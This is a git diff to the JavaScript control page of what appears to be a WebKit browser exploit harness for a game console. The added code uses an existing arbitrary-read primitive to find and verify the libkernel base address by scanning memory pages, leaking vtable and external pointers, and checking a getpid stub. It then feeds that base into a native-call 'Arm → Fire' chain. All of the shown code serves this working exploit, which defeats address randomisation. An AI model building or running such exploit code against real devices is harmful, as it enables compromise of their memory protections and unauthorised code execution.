@@ -42,12 +42,15 @@ import {
     tryPsfreePltBatch,
     resolveLibkernelPsfree,
     formatPsfreeStats,
+    resolveLibkernelFindChunk,
+    verifyLibkernelBase,
+    extPtrToLkCandidates,
 } from "./libkernel_resolve.js";
 import { createCrashLog } from "./log_persist.js";
 import { prepNativeChain, stageGetpid, fireGetpid } from "./native_call.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250830r";
+const BUILD_ID = "rw-20250831a";
 /** opt-in only — release triggers JSC GC */
 const PROMOTE_PAIR = params.get("promote") === "1";
 const SCAN_PIVOT_MIN = 0x10000;
@@ -221,9 +224,18 @@ function setUi() {
     if (btnLoadCal) btnLoadCal.disabled = busy || !ready;
     if (btnForceLk) btnForceLk.disabled = busy || !ready;
     if (btnGuessLk) btnGuessLk.disabled = busy || !ready;
-    if (btnPsfreeLite) btnPsfreeLite.disabled = !ready || (busy && !psfreeAutoScan);
-    if (btnPsfreeLk) btnPsfreeLk.disabled = !ready || (busy && !psfreeAutoScan);
-    if (btnPsfreeStop) btnPsfreeStop.disabled = !psfreeAutoScan;
+    if (btnPsfreeLite) {
+        btnPsfreeLite.disabled = !ready || (busy && !findLkAuto);
+        btnPsfreeLite.textContent = "Find lk lite";
+    }
+    if (btnPsfreeLk) {
+        btnPsfreeLk.disabled = !ready || (busy && !findLkAuto);
+        btnPsfreeLk.textContent = "Find lk";
+    }
+    if (btnPsfreeStop) {
+        btnPsfreeStop.disabled = !findLkAuto && !psfreeAutoScan;
+        btnPsfreeStop.textContent = "Stop find";
+    }
     if (btnPeek) btnPeek.disabled = busy || !ready;
     if (pickPtr) pickPtr.disabled = busy || !ready;
     if (addrIn) addrIn.disabled = busy || !ready;
@@ -269,27 +281,50 @@ function lkBaseFromCalEntry(c) {
     return alignModuleBase(codePtr);
 }
 
-function buildCalLkCandidates() {
+function buildCalLkCandidates(p, off, webkitBase) {
     const out = [];
+    const seen = new Set();
+    function push(entry) {
+        const k = String(entry.base);
+        if (seen.has(k)) return;
+        seen.add(k);
+        out.push(entry);
+    }
     const entries = calExtPtrCandidates();
     for (let i = 0; i < entries.length; i++) {
         const c = entries[i];
-        const base = lkBaseFromCalEntry(c);
-        if (!base) continue;
-        out.push({
-            label: c.label,
-            code: c.ptr,
-            magic: c.code,
-            base,
-            note: "align4k",
-        });
-        out.push({
-            label: c.label + " −4K",
-            code: c.ptr,
-            magic: c.code,
-            base: base.sub32(0x4000),
-            note: "align4k-4k",
-        });
+        const codePtr = parseAddr(c.ptr);
+        if (!codePtr) continue;
+        if (p && off && webkitBase) {
+            const bases = extPtrToLkCandidates(p, codePtr, off, webkitBase);
+            for (let b = 0; b < bases.length; b++) {
+                push({
+                    label: c.label + " (" + (b === 0 ? "page" : "kerr") + ")",
+                    code: c.ptr,
+                    magic: c.code,
+                    base: bases[b],
+                    note: b === 0 ? "ext-ptr" : "error-rva",
+                });
+            }
+        } else {
+            const base = lkBaseFromCalEntry(c);
+            if (base) {
+                push({
+                    label: c.label,
+                    code: c.ptr,
+                    magic: c.code,
+                    base,
+                    note: "align4k",
+                });
+                push({
+                    label: c.label + " −4K",
+                    code: c.ptr,
+                    magic: c.code,
+                    base: base.sub32(0x4000),
+                    note: "align4k-4k",
+                });
+            }
+        }
     }
     return out;
 }
@@ -374,6 +409,14 @@ let psfreePreset = null;
 const PSFREE_LITE = { maxReads: 12, yieldBatches: 1, cluster: true, label: "lite" };
 const PSFREE_NORM = { maxReads: 20, yieldBatches: 1, cluster: true, label: "norm" };
 
+let findLkState = null;
+let findLkAuto = false;
+let findLkStop = false;
+let findLkPreset = null;
+
+const FIND_LK_LITE = { maxPages: 64, label: "lite" };
+const FIND_LK_NORM = { maxPages: 256, label: "norm" };
+
 function parseCalPtr(raw) {
     const s = String(raw).replace(/^0x/i, "").trim();
     if (!s) return null;
@@ -408,6 +451,7 @@ const MANUAL_TESTS = [
     { id: "scan-iat", group: "base", label: "Scan libkernel" },
     { id: "leak-lk", group: "base", label: "Leak+vtable LK" },
     { id: "try-cal-ptrs", group: "base", label: "Load cal ptr" },
+    { id: "verify-lk", group: "base", label: "Verify lk" },
     { id: "show-lk", group: "base", label: "Show LK hints" },
     { id: "force-lk", group: "base", label: "Force lk" },
     { id: "paste-lk", group: "base", label: "Paste lk (1 peek)" },
@@ -543,6 +587,10 @@ function runManualTest(testId) {
         }
         if (testId === "try-cal-ptrs") {
             runTryCalPtrs();
+            return;
+        }
+        if (testId === "verify-lk") {
+            runVerifyLk();
             return;
         }
         if (testId === "stub20") {
@@ -1822,7 +1870,10 @@ let leakScanState = null;
 
 function runTryCalPtrs() {
     if (!ready || busy) return;
-    if (!calLkCands) calLkCands = buildCalLkCandidates();
+    const p = window.p;
+    const off = loadEffectiveOff();
+    const { webkitBase } = basesFromSession(off);
+    calLkCands = buildCalLkCandidates(p, off, webkitBase);
     if (calPtrIdx >= calLkCands.length) {
         calPtrIdx = 0;
         mark("LK-CAL-DONE", "cycle reset — tried all " + calLkCands.length + " bases");
@@ -1835,18 +1886,170 @@ function runTryCalPtrs() {
     lkQuiet = true;
     mark("LK-CAL", "build=" + BUILD_ID + " " + calPtrIdx + "/" + calLkCands.length
         + " " + c.label + " code=" + c.code + " magic=" + c.magic
-        + " → base=" + c.base + " (" + c.note + ", 0 reads)");
-    mark("LK-HINT", "Force lk → Arm → Fire. Do NOT Paste/peek cal code ptrs (OOM)");
+        + " → base=" + c.base + " (" + c.note + ")");
+    if (p && c.base) {
+        const v = verifyLibkernelBase(p, c.base, off);
+        if (v.ok && v.strong)
+            mark("LK-CAL-VERIFY", "OK prologue + getpid stub @ +" + v.stubOff.toString(16));
+        else if (v.ok)
+            mark("LK-CAL-VERIFY", "weak — " + (v.warn || "prologue only"));
+        else
+            mark("LK-CAL-VERIFY", "BAD — " + (v.error || "?"));
+    }
+    mark("LK-HINT", "Verify lk or Force lk → Arm → Fire (no peek on code ptrs)");
     lkQuiet = false;
     if (outEl) {
         outEl.textContent = lines.join("\n");
         outEl.scrollTop = outEl.scrollHeight;
     }
-    state("base " + calPtrIdx + "/" + calLkCands.length + " → Force lk", "warn");
+    state("base " + calPtrIdx + "/" + calLkCands.length + " — Verify or Force lk", "warn");
     try {
         crashLog.append("LK-CAL " + c.label + " base=" + c.base, "LK-CAL");
         crashLog.flushSync();
     } catch (_) { }
+}
+
+function runVerifyLk() {
+    if (!ready || !window.p || busy) return;
+    const p = window.p;
+    const off = loadEffectiveOff();
+    const lk = lkFromUi();
+    if (!lk) {
+        mark("LK-SKIP", "hex box empty — Load cal ptr or Find lk first");
+        return;
+    }
+    const v = verifyLibkernelBase(p, lk, off);
+    if (v.ok && v.strong) {
+        saveLibkernelSession(lk, null);
+        mark("LK-VERIFY-OK", String(lk) + " stub+" + v.stubOff.toString(16) + " build=" + BUILD_ID);
+        state("lk verified — Arm → Fire", "ok");
+    } else if (v.ok) {
+        mark("LK-VERIFY-WARN", String(lk) + " " + (v.warn || "weak"));
+        state("weak lk — try next cal base or Find lk", "warn");
+    } else {
+        mark("LK-VERIFY-BAD", v.error || "bad");
+        state("lk verify failed", "bad");
+    }
+    renderOut();
+    crashLog.append("VERIFY " + (v.ok ? "OK" : "FAIL") + " " + lk, "LK-VERIFY");
+    crashLog.flushSync();
+}
+
+function finishFindLkChunk(chunk) {
+    if (chunk.ok && chunk.lk) {
+        findLkState = null;
+        findLkAuto = false;
+        findLkStop = false;
+        if (addrIn) addrIn.value = String(chunk.lk);
+        mark("LK-FIND-OK", (chunk.source || chunk.phase) + " → " + chunk.lk
+            + " build=" + BUILD_ID);
+        const p = window.p;
+        if (p) {
+            const v = verifyLibkernelBase(p, chunk.lk, loadEffectiveOff());
+            if (v.ok && v.strong)
+                mark("LK-VERIFY-OK", "stub+" + v.stubOff.toString(16));
+            else if (v.ok)
+                mark("LK-VERIFY-WARN", v.warn || "weak");
+        }
+        state("Find lk OK — Force lk → Arm → Fire", "ok");
+        crashLog.append("LK-FIND-OK " + chunk.lk, "LK-FIND");
+        crashLog.flushSync();
+        return true;
+    }
+    if (chunk.done && !chunk.ok) {
+        findLkState = null;
+        findLkAuto = false;
+        findLkStop = false;
+        mark("LK-FIND-MISS", (chunk.error || chunk.phase || "miss")
+            + (chunk.extList && chunk.extList.length
+                ? " ext=" + chunk.extList.map(e => e.ptr).join(",") : "")
+            + " build=" + BUILD_ID);
+        mark("LK-HINT", "PLT/PSFree patched on poops — need webkit dump for import RVAs");
+        state("Find lk miss — Load cal ptr + Verify lk", "bad");
+        crashLog.flushSync();
+        return true;
+    }
+    return false;
+}
+
+function stopFindLk() {
+    findLkStop = true;
+    psfreeAutoStop = true;
+    state("Find lk stopping…", "warn");
+}
+
+/** Guess → below-webkit → vtable leak (no PLT, no g5 island). */
+async function runFindLkAuto(preset) {
+    if (!ready || !window.p) return;
+    if (findLkAuto) return;
+    const p = window.p;
+    const off = loadEffectiveOff();
+    const { nativeFn, webkitBase } = basesFromSession(off);
+    if (!webkitBase) {
+        mark("LK-SKIP", "no webkitBase — Start first");
+        return;
+    }
+
+    findLkPreset = preset || FIND_LK_LITE;
+    findLkState = null;
+    findLkAuto = true;
+    findLkStop = false;
+    busy = true;
+    setUi();
+    mark("LK-FIND", "auto " + findLkPreset.label
+        + " below-pages=" + findLkPreset.maxPages
+        + " build=" + BUILD_ID);
+    renderOut();
+
+    const opts = {
+        nativeFn,
+        maxPages: findLkPreset.maxPages,
+        retain: retained,
+    };
+    let loops = 0;
+
+    try {
+        while (findLkAuto && !findLkStop) {
+            const chunk = resolveLibkernelFindChunk(p, webkitBase, off, findLkState, opts);
+            findLkState = chunk.state;
+            if (chunk.phase === "guess-start")
+                mark("LK-FIND", "phase guess (wk-relative, 2 reads/cand)");
+            else if (chunk.phase === "below-next")
+                mark("LK-FIND", "phase below-webkit (16KB pages)");
+            else if (chunk.phase === "leak-next")
+                mark("LK-FIND", "phase vtable/leak ext ptrs");
+            else if (chunk.phase === "below" || chunk.phase === "leak" || chunk.phase === "guess")
+                state("Find " + findLkPreset.label + " " + chunk.phase
+                    + (chunk.at ? " @" + chunk.at : "")
+                    + (chunk.tried != null ? " tried=" + chunk.tried : ""), "warn");
+            if (finishFindLkChunk(chunk)) {
+                renderOut();
+                return;
+            }
+            loops++;
+            if (loops % 3 === 0) {
+                mark("LK-FIND", findLkPreset.label + " " + (chunk.phase || "?")
+                    + (chunk.pages != null ? " pages=" + chunk.pages : "")
+                    + (chunk.tried != null ? " tried=" + chunk.tried : ""));
+                crashLog.flushSync();
+                renderOut();
+            }
+            await new Promise(function (r) { setTimeout(r, 2); });
+        }
+        if (findLkStop)
+            mark("LK-FIND", "stopped");
+    } catch (err) {
+        mark("LK-FIND-FAIL", err.message || String(err));
+        if (findLkState)
+            mark("LK-FIND-PARTIAL", formatPsfreeStats(findLkState));
+    } finally {
+        findLkAuto = false;
+        findLkStop = false;
+        findLkPreset = null;
+        busy = false;
+        setUi();
+        renderOut();
+    }
 }
 
 function runGuessLk() {
@@ -2754,9 +2957,9 @@ function init() {
     wireClick(btnLoadCal, function () { runTryCalPtrs(); });
     wireClick(btnForceLk, function () { runManualTest("force-lk"); });
     wireClick(btnGuessLk, function () { runGuessLk(); });
-    wireClick(btnPsfreeLite, function () { return runPsfreeLkAuto(PSFREE_LITE); });
-    wireClick(btnPsfreeLk, function () { return runPsfreeLkAuto(PSFREE_NORM); });
-    wireClick(btnPsfreeStop, function () { stopPsfreeScan(); });
+    wireClick(btnPsfreeLite, function () { return runFindLkAuto(FIND_LK_LITE); });
+    wireClick(btnPsfreeLk, function () { return runFindLkAuto(FIND_LK_NORM); });
+    wireClick(btnPsfreeStop, function () { stopFindLk(); });
     wireClick(btnClear, function () {
         lines.length = 0;
         clearPersistedLog();
